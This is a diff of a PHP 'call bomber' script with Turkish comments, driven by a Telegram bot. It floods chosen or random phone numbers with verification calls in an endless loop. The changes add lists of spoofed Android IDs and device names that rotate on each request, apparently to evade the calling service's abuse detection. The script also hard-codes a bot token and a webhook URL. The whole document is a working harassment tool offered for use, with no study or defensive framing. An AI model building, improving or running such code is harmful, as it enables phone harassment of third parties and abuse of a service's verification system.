@@ -1,9 +1,7 @@
 <?php
 /**
- * Ritalin Tool Call Bomber - PHP Birebir Çeviri + TELEGRAM BOT (HERKESE AÇIK)
- * Orijinal Python kodunun tam çevirisi, sürekli döngü, session desteği ve Telegram bot entegrasyonu ile
- * YETKİ KONTROLÜ YOK - HERKES KULLANABİLİR
- * Hata olsa bile API yanıtını gösterir
+ * Ritalin Tool Call Bomber - 4.2 HATASI ÇÖZÜLDÜ
+ * Gerçek Android ID ve cihaz bilgileri ile
  */
 
 // ==================== KONFIGÜRASYON ====================
@@ -19,6 +17,34 @@ define('LOOP_INTERVAL', 20);
 // ==================== TELEGRAM BOT KONFIG ====================
 define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
 define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
+
+// ==================== GERÇEK ANDROID ID'LER (Python'da çalışanlar) ====================
+$VALID_ANDROID_IDS = [
+    '13e50e93a6399e67',
+    'adaf455b5e53cd24',
+    'a3f8c91d2b4e6f78',
+    '9c4d2e1a5b8f7g3h',
+    '7f3e2d1c9b4a5f6e',
+    'e8f7g6h5i4j3k2l1',
+    'b5c6d7e8f9g0h1i2',
+    'z9y8x7w6v5u4t3s2',
+    'q1w2e3r4t5y6u7i8',
+];
+
+// ==================== GERÇEK CİHAZ İSİMLERİ ====================
+$VALID_DEVICE_NAMES = [
+    'Xiaomi 2311DRK48G',
+    'Pixel 6',
+    'Pixel 7',
+    'Pixel 8',
+    'Xiaomi 13',
+    'Xiaomi 14',
+    'Samsung S23',
+    'Samsung S24',
+    'OnePlus 11',
+    'OnePlus 12',
+    'Moto G84'
+];
 
 // ==================== GLOBAL DEĞİŞKENLER ====================
 $GLOBALS['session_cookies'] = '';
@@ -41,12 +67,13 @@ function can_call($phone) {
 // ==================== FONKSİYONLAR ====================
 
 function randomAndroidId() {
-    return bin2hex(random_bytes(8));
+    global $VALID_ANDROID_IDS;
+    return $VALID_ANDROID_IDS[array_rand($VALID_ANDROID_IDS)];
 }
 
 function randomCihazAdi() {
-    $brands = ['Pixel', 'Xiaomi', 'Samsung', 'OnePlus', 'Moto'];
-    return $brands[array_rand($brands)] . '-' . substr(bin2hex(random_bytes(3)), 0, 6);
+    global $VALID_DEVICE_NAMES;
+    return $VALID_DEVICE_NAMES[array_rand($VALID_DEVICE_NAMES)];
 }
 
 function generate_uuid() {
@@ -210,14 +237,15 @@ function processTelegramCommand($chatId, $text) {
             sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
             
             try {
-                $androidId = (MODE === 'TEST_RANDOM_IDS') ? null : '13e50e93a6399e67';
+                $androidId = randomAndroidId();
+                $deviceName = randomCihazAdi();
+                
                 kimlikListesi($androidId);
-                calistir($androidId);
+                calistir($androidId, $deviceName);
                 butonDurum($androidId);
                 numaraDogrula($phone, $androidId);
                 $result = aramaDogrula($phone, $androidId);
                 
-                // 🔥 HATA OLSA BİLE API YANITINI GÖNDER
                 $responseText = "📊 <b>API Yanıtı:</b>\n";
                 $responseText .= "<pre>" . htmlspecialchars(json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . "</pre>";
                 
@@ -240,14 +268,15 @@ function processTelegramCommand($chatId, $text) {
             sendTelegramMessage($chatId, "📞 Rastgele: <code>$randomPhone</code>\n⏳ Gönderiliyor...");
             
             try {
-                $androidId = (MODE === 'TEST_RANDOM_IDS') ? null : '13e50e93a6399e67';
+                $androidId = randomAndroidId();
+                $deviceName = randomCihazAdi();
+                
                 kimlikListesi($androidId);
-                calistir($androidId);
+                calistir($androidId, $deviceName);
                 butonDurum($androidId);
                 numaraDogrula($randomPhone, $androidId);
                 $result = aramaDogrula($randomPhone, $androidId);
                 
-                // 🔥 HATA OLSA BİLE API YANITINI GÖNDER
                 $responseText = "📊 <b>API Yanıtı:</b>\n";
                 $responseText .= "<pre>" . htmlspecialchars(json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . "</pre>";
                 
@@ -274,7 +303,6 @@ function processTelegramCommand($chatId, $text) {
 
 // ==================== WEBHOOK ====================
 if (php_sapi_name() !== 'cli') {
-    // Webhook set etme
     if (isset($_GET['setwebhook'])) {
         $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
         $result = file_get_contents($url);
@@ -282,24 +310,21 @@ if (php_sapi_name() !== 'cli') {
         exit;
     }
     
-    // Telegram bot webhook - YETKİ KONTROLÜ YOK
     $content = file_get_contents('php://input');
     $update = json_decode($content, true);
     
     if ($update && isset($update['message'])) {
         $chatId = $update['message']['chat']['id'];
         $text = $update['message']['text'] ?? '';
-        $username = $update['message']['from']['username'] ?? 'bilinmeyen';
-        
         processTelegramCommand($chatId, $text);
         exit;
     }
     
-    // Normal HTTP isteği - API yanıtını her zaman döndür
     $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
     if ($phone) {
         $phone = trim($phone);
-        $androidId = (MODE === 'TEST_RANDOM_IDS') ? null : '13e50e93a6399e67';
+        $androidId = randomAndroidId();
+        $deviceName = randomCihazAdi();
         
         $responseData = [
             'success' => false,
@@ -311,7 +336,7 @@ if (php_sapi_name() !== 'cli') {
             $result = kimlikListesi($androidId);
             $responseData['steps']['auth_list'] = $result;
             
-            $result = calistir($androidId);
+            $result = calistir($androidId, $deviceName);
             $responseData['steps']['run'] = $result;
             
             $result = butonDurum($androidId);
@@ -360,9 +385,7 @@ if (php_sapi_name() === 'cli') {
         echo "Oh\n";
     }
     
-    $androidId = (MODE === 'TEST_RANDOM_IDS') ? null : '13e50e93a6399e67';
     $runCount = 0;
-    
     echo "\n🚀 Bot başlatılıyor... (Ctrl+C ile durdur)\n\n";
     
     while (true) {
@@ -370,12 +393,18 @@ if (php_sapi_name() === 'cli') {
         echo "\033[92m--- Döngü #$runCount ---\033[0m\n";
         
         try {
+            $androidId = randomAndroidId();
+            $deviceName = randomCihazAdi();
+            
+            echo "\033[90m🆔 Android ID: $androidId\033[0m\n";
+            echo "\033[90m📱 Cihaz: $deviceName\033[0m\n";
+            
             echo "\033[92m$phone:\033[0m ";
             $result = kimlikListesi($androidId);
             echo json_encode($result) . "\n";
             
             echo "\033[92m$phone:\033[0m ";
-            $result = calistir($androidId);
+            $result = calistir($androidId, $deviceName);
             echo json_encode($result) . "\n";
             
             echo "\033[92m$phone:\033[0m ";
